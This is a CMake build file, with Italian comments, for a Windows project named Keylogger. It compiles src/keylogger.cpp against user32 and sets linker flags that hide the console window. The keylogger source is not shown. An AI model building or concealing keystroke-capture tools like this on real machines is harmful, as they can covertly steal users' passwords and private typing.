cmake_minimum_required(VERSION 3.10)
project(Keylogger)

set(CMAKE_CXX_STANDARD 17)

# Crea l'eseguibile
add_executable(keylogger src/keylogger.cpp)

# Linka le librerie Windows
target_link_libraries(keylogger user32)

# Nasconde la console (Windows)
if(WIN32)
    set_target_properties(keylogger PROPERTIES
        LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup"
    )
endif()